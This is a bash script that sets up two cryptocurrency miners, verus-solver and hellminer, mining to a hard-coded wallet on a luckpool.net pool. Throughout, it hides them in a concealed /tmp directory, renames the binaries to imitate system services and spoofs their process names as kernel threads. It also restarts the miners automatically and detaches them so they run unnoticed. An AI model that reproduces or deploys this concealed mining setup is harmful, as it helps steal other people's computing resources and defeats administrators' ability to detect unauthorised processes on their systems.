#!/bin/bash
# Dual Miner Stealth Setup - Verus-Solver + Hellminer

echo "=== DUAL MINER STEALTH SETUP ==="
echo "Setting up verus-solver + hellminer communication"
echo ""

# ================= CONFIGURATION =================
WALLET="RVMo7fjYHfWrPbEEPP4PYc2ZLeh55Zy5dq"
POOL="stratum+tcp://eu.luckpool.net:3956"
WORKER="dual$(hostname | cut -c1-4)"

# ================= CHECK BOTH MINERS =================
echo "[1/6] Checking for both miners..."

if [ ! -f "/home/ubuntu/vs-mn/verus-solver" ]; then
    echo "✗ ERROR: verus-solver not found at /home/ubuntu/vs-mn/verus-solver"
    exit 1
fi

if [ ! -f "/home/ubuntu/vs-mn/hellminer" ]; then
    echo "✗ ERROR: hellminer not found at /home/ubuntu/vs-mn/hellminer"
    exit 1
fi

echo "✓ Both miners found"
echo "  verus-solver: $(stat -c%s /home/ubuntu/vs-mn/verus-solver) bytes"
echo "  hellminer: $(stat -c%s /home/ubuntu/vs-mn/hellminer) bytes"

# ================= CREATE STEALTH DIRECTORY =================
echo ""
echo "[2/6] Creating stealth directory..."

STEALTH_DIR="/tmp/.sys_modules_$(date +%s)"
mkdir -p "$STEALTH_DIR"
cd "$STEALTH_DIR"

echo "✓ Created: $STEALTH_DIR"

# ================= COPY AND OBFUSCATE BOTH MINERS =================
echo ""
echo "[3/6] Obfuscating both miners..."

# Copy and rename verus-solver
cp "/home/ubuntu/vs-mn/verus-solver" "./systemd_hwmon"
chmod +x "./systemd_hwmon"
echo "✓ verus-solver → systemd_hwmon"

# Copy and rename hellminer  
cp "/home/ubuntu/vs-mn/hellminer" "./irq_balancer"
chmod +x "./irq_balancer"
echo "✓ hellminer → irq_balancer"

# Create shared config
cat > miner_config.json << CONFIG
{
    "pool_url": "$POOL",
    "wallet_address": "$WALLET",
    "worker_name": "$WORKER",
    "password": "x",
    "algorithm": "verus",
    "cpu_threads": 2,
    "tls_enabled": false,
    "nicehash": false
}
CONFIG

echo "✓ Shared config created"

# ================= CREATE COMMUNICATION SCRIPT =================
echo ""
echo "[4/6] Creating communication script..."

cat > start_dual_miners.sh << 'SCRIPT'
#!/bin/bash
# Dual miner communication script

cd "$(dirname "$0")"

echo "=== DUAL MINER START $(date) ===" > miner.log

# Create communication pipe
PIPE_PATH="./miner_pipe"
rm -f "$PIPE_PATH"
mkfifo "$PIPE_PATH"

# Function to start verus-solver (primary)
start_verus() {
    echo "[$(date)] Starting verus-solver (systemd_hwmon)" >> miner.log
    exec -a "[kworker/dual:0]" ./systemd_hwmon \
        --algo verus \
        --pool stratum+tcp://eu.luckpool.net:3956 \
        --wallet WALLET_PLACEHOLDER.DUAL_WORKER \
        --pass x \
        --cpu-threads 1 \
        --nicehash 0 \
        --tls 0 \
        --keepalive >> verus.log 2>&1 &
    VERUS_PID=$!
    echo $VERUS_PID > .verus.pid
    return $VERUS_PID
}

# Function to start hellminer (secondary)
start_hellminer() {
    echo "[$(date)] Starting hellminer (irq_balancer)" >> miner.log
    exec -a "[irq/dual:0]" ./irq_balancer \
        -c stratum+tcp://eu.luckpool.net:3956 \
        -u WALLET_PLACEHOLDER.hell_worker \
        -p x \
        --cpu 1 >> hellminer.log 2>&1 &
    HELL_PID=$!
    echo $HELL_PID > .hell.pid
    return $HELL_PID
}

# Function to monitor both miners
monitor_miners() {
    while true; do
        # Check verus-solver
        if ! kill -0 $VERUS_PID 2>/dev/null; then
            echo "[$(date)] verus-solver died, restarting..." >> miner.log
            start_verus
            VERUS_PID=$?
        fi
        
        # Check hellminer
        if ! kill -0 $HELL_PID 2>/dev/null; then
            echo "[$(date)] hellminer died, restarting..." >> miner.log
            start_hellminer
            HELL_PID=$?
        fi
        
        # Share stats between miners (simulated communication)
        if [ -f verus.log ] && [ -f hellminer.log ]; then
            VERUS_STATS=$(tail -1 verus.log 2>/dev/null | grep -o "status:.*" || echo "no_stats")
            HELL_STATS=$(tail -1 hellminer.log 2>/dev/null | grep -o "accepted.*" || echo "no_stats")
            
            echo "[$(date)] Stats - Verus: $VERUS_STATS, Hell: $HELL_STATS" >> shared_stats.log
        fi
        
        sleep 30
    done
}

# Cleanup function
cleanup() {
    kill $VERUS_PID $HELL_PID 2>/dev/null
    rm -f "$PIPE_PATH" .verus.pid .hell.pid
    exit 0
}

trap cleanup SIGINT SIGTERM

# Main execution
echo "Starting dual mining system..."
start_verus
VERUS_PID=$?
sleep 5

start_hellminer
HELL_PID=$?
sleep 5

echo "Both miners started:"
echo "  verus-solver PID: $VERUS_PID"
echo "  hellminer PID: $HELL_PID"
echo ""

# Start monitoring
monitor_miners
SCRIPT

# Replace wallet placeholder
sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" start_dual_miners.sh
sed -i "s/DUAL_WORKER/$WORKER/g" start_dual_miners.sh

chmod +x start_dual_miners.sh
echo "✓ Communication script created"

# ================= CREATE COMBINED CONFIG =================
echo ""
echo "[5/6] Creating combined configuration..."

cat > combined_launcher.sh << 'LAUNCHER'
#!/bin/bash
# Combined launcher for both miners

WORKDIR="$(cd "$(dirname "$0")" && pwd)"
cd "$WORKDIR"

# Kill any existing instances
pkill -f "systemd_hwmon"
pkill -f "irq_balancer"
pkill -f "kworker/dual"
pkill -f "irq/dual"

# Start the dual mining system
nohup ./start_dual_miners.sh > /dev/null 2>&1 &

# Wait and check
sleep 10
if pgrep -f "systemd_hwmon" > /dev/null && pgrep -f "irq_balancer" > /dev/null; then
    echo "✓ Both miners started successfully"
    echo "  verus-solver: $(pgrep -f 'systemd_hwmon')"
    echo "  hellminer: $(pgrep -f 'irq_balancer')"
    
    # Hide processes better
    for pid in $(pgrep -f "systemd_hwmon"); do
        [ -w "/proc/$pid/comm" ] && echo "kworker/dual:v" > "/proc/$pid/comm" 2>/dev/null
    done
    
    for pid in $(pgrep -f "irq_balancer"); do
        [ -w "/proc/$pid/comm" ] && echo "irq/dual:h" > "/proc/$pid/comm" 2>/dev/null
    done
else
    echo "✗ Failed to start both miners"
    echo "Check logs: tail -f $WORKDIR/miner.log"
fi
LAUNCHER

chmod +x combined_launcher.sh

# ================= START AND VERIFY =================
echo ""
echo "[6/6] Starting and verifying..."

./combined_launcher.sh

sleep 5

echo ""
echo "=== VERIFICATION ==="
echo "Directory: $STEALTH_DIR"
echo ""
echo "Process Check:"
ps aux | grep -E "systemd_hwmon|irq_balancer|kworker/dual|irq/dual" | grep -v grep

echo ""
echo "CPU Usage:"
for pid in $(pgrep -f "systemd_hwmon"); do
    ps -p $pid -o %cpu,cmd 2>/dev/null
done
for pid in $(pgrep -f "irq_balancer"); do
    ps -p $pid -o %cpu,cmd 2>/dev/null
done

echo ""
echo "Connections:"
ss -tunap 2>/dev/null | grep 3956 | grep -v LISTEN || netstat -tunap 2>/dev/null | grep 3956

echo ""
echo "Log Files:"
ls -la *.log 2>/dev/null

echo ""
echo "=== SETUP COMPLETE ==="
echo "Both miners are running in: $STEALTH_DIR"
echo "They communicate via shared logs and monitoring"
echo ""
echo "To monitor: tail -f $STEALTH_DIR/miner.log"
echo "To stop: cd $STEALTH_DIR && pkill -f 'systemd_hwmon|irq_balancer'"
echo ""
echo "Original files have been copied and obfuscated"
